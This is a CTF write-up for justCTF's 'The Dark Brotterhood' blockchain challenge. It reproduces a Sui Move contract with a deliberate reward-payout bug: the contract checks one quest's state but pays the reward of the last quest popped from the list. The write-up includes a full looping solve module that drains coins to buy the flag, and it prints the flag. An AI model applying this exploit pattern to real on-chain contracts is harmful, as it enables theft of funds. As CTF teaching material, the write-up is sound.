# The Dark Brotterhood

## Description
```
In the shadowed corners of the Dark Brotterhood's secrets, lies a tavern where valiant Otters barter for swords and shields. Here, amidst whispers of hidden bounties, adventurers find the means to battle fearsome monsters for rich rewards. Join this clandestine fellowship, where the blockchain holds mysteries to uncover. Otters of Valor, your destiny calls; may your path be lined with both honor and gold.

- nc db.nc.jctf.pro 31337
```

## Provided Files
```
- db_docker.tar.gz
```

## Writeup

> [!NOTE]
> Writeup by [kdm](https://github.com/FRoith)
> Credit to [Philogic](https://github.com/PhilippSchweinzer) who managed to endure my waning sanity (and helped with the challenge too).

This is the last challenge in the Blockchain series, I will try and be brief:

```rust
module challenge::Otter {

    // ---------------------------------------------------
    // DEPENDENCIES
    // ---------------------------------------------------

    use sui::coin::{Self, Coin};
    use sui::balance::{Self, Supply};
    use sui::url;
    use sui::random::{Self, Random};
    use sui::table::{Self, Table};

    // ---------------------------------------------------
    // CONST
    // ---------------------------------------------------

    const NEW: u64 = 1;
    const WON: u64 = 2;
    const FINISHED: u64 = 3;

    const WRONG_AMOUNT: u64 = 1337;
    const BETTER_BRING_A_KNIFE_TO_A_GUNFIGHT: u64 = 1338;
    const WRONG_STATE: u64 = 1339;
    const ALREADY_REGISTERED: u64 = 1340;
    const NOT_REGISTERED: u64 = 1341;
    const TOO_MUCH_MONSTERS: u64 = 1342;
    const NOT_SOLVED: u64 = 1343;
    
    const QUEST_LIMIT: u64 = 25;
    // ---------------------------------------------------
    // STRUCTS
    // ---------------------------------------------------

    public struct OTTER has drop {}

    public struct OsecSuply<phantom CoinType> has key {
        id: UID,
        supply: Supply<CoinType>
    }

    public struct Vault<phantom CoinType> has key {
        id: UID,
        cash: Coin<CoinType>
    }

    public struct Monster has store {
        fight_status: u64,
        reward: u8,
        power: u8
    }

    public struct QuestBoard has key, store {
        id: UID,
        quests: vector<Monster>,
        players: Table<address, bool>
    }

    public struct Flag has key, store {
        id: UID,
        user: address,
        flag: bool
    }

    public struct Player has key, store {
        id: UID,
        user: address,
        coins: Coin<OTTER>,
        power: u8
    }

    // ---------------------------------------------------
    // MINT CASH
    // ---------------------------------------------------

    fun init(witness: OTTER, ctx: &mut TxContext) {
        let (mut treasury, metadata) = coin::create_currency(
            witness, 9, b"OSEC", b"Osec", b"Otter ca$h", option::some(url::new_unsafe_from_bytes(b"https://osec.io/")), ctx
        );
        transfer::public_freeze_object(metadata);

        let pool_liquidity = coin::mint<OTTER>(&mut treasury, 50000, ctx);

        let vault = Vault<OTTER> {
            id: object::new(ctx),
            cash: pool_liquidity
        };

        let supply = coin::treasury_into_supply(treasury);

        let osec_supply = OsecSuply<OTTER> {
            id: object::new(ctx),
            supply
        };

        transfer::transfer(osec_supply, tx_context::sender(ctx));

        transfer::share_object(QuestBoard {
            id: object::new(ctx),
            quests: vector::empty(),
            players: table::new(ctx)
        });

        transfer::share_object(vault);
    }

    public fun mint(sup: &mut OsecSuply<OTTER>, amount: u64, ctx: &mut TxContext): Coin<OTTER> {
        let osecBalance = balance::increase_supply(&mut sup.supply, amount);
        coin::from_balance(osecBalance, ctx)
    }

    public entry fun mint_to(sup: &mut OsecSuply<OTTER>, amount: u64, to: address, ctx: &mut TxContext) {
        let osec = mint(sup, amount, ctx);
        transfer::public_transfer(osec, to);
    }

    public fun burn(sup: &mut OsecSuply<OTTER>, c: Coin<OTTER>): u64 {
        balance::decrease_supply(&mut sup.supply, coin::into_balance(c))
    }

    // ---------------------------------------------------
    // REGISTER
    // ---------------------------------------------------

    public fun register(sup: &mut OsecSuply<OTTER>, board: &mut QuestBoard, player: address, ctx: &mut TxContext) {
        assert!(!table::contains(&board.players, player), ALREADY_REGISTERED);

        table::add(&mut board.players, player, false);

        transfer::transfer(Player {
            id: object::new(ctx),
            user: tx_context::sender(ctx),
            coins: mint(sup, 137, ctx),
            power: 10
        }, player);
    }

    // ---------------------------------------------------
    // SHOP
    // ---------------------------------------------------

    #[allow(lint(self_transfer))]
    public fun buy_flag(vault: &mut Vault<OTTER>, player: &mut Player, ctx: &mut TxContext): Flag {
        assert!(coin::value(&player.coins) >= 1337, WRONG_AMOUNT);

        let coins = coin::split(&mut player.coins, 1337, ctx);
        coin::join(&mut vault.cash, coins);

        Flag {
            id: object::new(ctx),
            user: tx_context::sender(ctx),
            flag: true
        }
    }

    public fun buy_sword(vault: &mut Vault<OTTER>, player: &mut Player, ctx: &mut TxContext) {
        assert!(coin::value(&player.coins) >= 137, WRONG_AMOUNT);

        let coins = coin::split(&mut player.coins, 137, ctx);
        coin::join(&mut vault.cash, coins);

        player.power = player.power + 100;
    }

    // ---------------------------------------------------
    // ADVENTURE TIME
    // ---------------------------------------------------

    #[allow(lint(public_random))]
    public fun find_a_monster(board: &mut QuestBoard, r: &Random, ctx: &mut TxContext) {
        assert!(vector::length(&board.quests) <= QUEST_LIMIT, TOO_MUCH_MONSTERS);

        let mut generator = random::new_generator(r, ctx);

        let quest = Monster {
            fight_status: NEW,
            reward: random::generate_u8_in_range(&mut generator, 13, 37),
            power: random::generate_u8_in_range(&mut generator, 13, 73)
        };

        vector::push_back(&mut board.quests, quest);

    }
    
    public fun fight_monster(board: &mut QuestBoard, player: &mut Player, quest_id: u64) {
        let quest = vector::borrow_mut(&mut board.quests, quest_id);
        assert!(quest.fight_status == NEW, WRONG_STATE);
        assert!(player.power > quest.power, BETTER_BRING_A_KNIFE_TO_A_GUNFIGHT);

        player.power = 10; // sword breaks after fighting the monster :c

        quest.fight_status = WON;
    }

    public fun return_home(board: &mut QuestBoard, quest_id: u64) {
        let quest_to_finish = vector::borrow_mut(&mut board.quests, quest_id);
        assert!(quest_to_finish.fight_status == WON, WRONG_STATE);

        quest_to_finish.fight_status = FINISHED;
    }

    #[allow(lint(self_transfer))]
    public fun get_the_reward(
        vault: &mut Vault<OTTER>,
        board: &mut QuestBoard,
        player: &mut Player,
        quest_id: u64,
        ctx: &mut TxContext,
    ) {
        let quest_to_claim = vector::borrow_mut(&mut board.quests, quest_id);
        assert!(quest_to_claim.fight_status == FINISHED, WRONG_STATE);

        let monster = vector::pop_back(&mut board.quests);

        let Monster {
            fight_status: _,
            reward: reward,
            power: _
        } = monster;

        let coins = coin::split(&mut vault.cash, (reward as u64), ctx); 
        coin::join(&mut player.coins, coins);
    }

    // ---------------------------------------------------
    // PROVE SOLUTION
    // ---------------------------------------------------

    public fun prove(board: &mut QuestBoard, flag: Flag) {
        let Flag {
            id,
            user,
            flag
        } = flag;

        object::delete(id);

        assert!(table::contains(&board.players, user), NOT_REGISTERED);
        assert!(flag, NOT_SOLVED);
        *table::borrow_mut(&mut board.players, user) = true;
    }

    // ---------------------------------------------------
    // CHECK WINNER
    // ---------------------------------------------------

    public fun check_winner(board: &QuestBoard, player: address) {
        assert!(*table::borrow(&board.players, player) == true, NOT_SOLVED);
    }

}
```

Another long one, and here is the solve interface:
```rust
module solve::solve {

    // [*] Import dependencies
    use challenge::Otter::{Self, OTTER};
    use sui::random::Random;

    #[allow(lint(public_random))]
    public fun solve(
        _vault: &mut Otter::Vault<OTTER>,
        _questboard: &mut Otter::QuestBoard,
        _player: &mut Otter::Player,
        _r: &Random,
        _ctx: &mut TxContext,
    ) {
        // Your code here ...
    }

}
```

This challenge is similar to the previous `World of Ottercraft`, but implemented differently. State checking that seems way more sane, and only a sword and the flag to buy. Also, instant purchases, instead of a checkout. I will not go into detail about all the functions this time, but the first part is, that we can always add multiple monsters to the quest board, as long as we don't exceed 25 at once. Our real exploit this time is in the `get_the_reward` function, which checks the monster at the index of the completed quest, to see if it is defeated, but then gets a monster from the list with `pop_back`, which pops the last element from the list, and pays out the reward from *that* monster.

This makes the exploit straightforward: Fill the questboard, buy a sword, fight the monster at quest index 0, and then get the reward from all the monsters on the questboard.

If we do this often enoug, we should be able to purchase the flag, and call `prove`, which will result in us getting the flag from the server.

Here is the code:
```rust
module solve::solve {

    // [*] Import dependencies
    use challenge::Otter::{Self, OTTER};
    use sui::random::Random;

    #[allow(lint(public_random))]
    public fun solve(
        _vault: &mut Otter::Vault<OTTER>,
        _questboard: &mut Otter::QuestBoard,
        _player: &mut Otter::Player,
        _r: &Random,
        _ctx: &mut TxContext,
    ) {
        let mut j = 0;
        while (j < 10) {
            let mut i = 0;
            while(i < 24) {
                challenge::Otter::find_a_monster(_questboard, _r, _ctx);
                i = i + 1;
            };
            challenge::Otter::buy_sword(_vault, _player, _ctx);
            challenge::Otter::fight_monster(_questboard, _player, 0);
            challenge::Otter::return_home(_questboard, 0);
            i = 0;
            while(i < 24) {
                challenge::Otter::get_the_reward(_vault, _questboard, _player, 0, _ctx);
                i = i + 1;
            };
            j = j + 1;
        };
        let flag = challenge::Otter::buy_flag(_vault, _player, _ctx);
        challenge::Otter::prove(_questboard, flag);
    }

}
```

Which gets us the flag: 
`justCTF{I_us3d_to_b3_an_ott3r_until_i_t00k_th4t_arr0w}`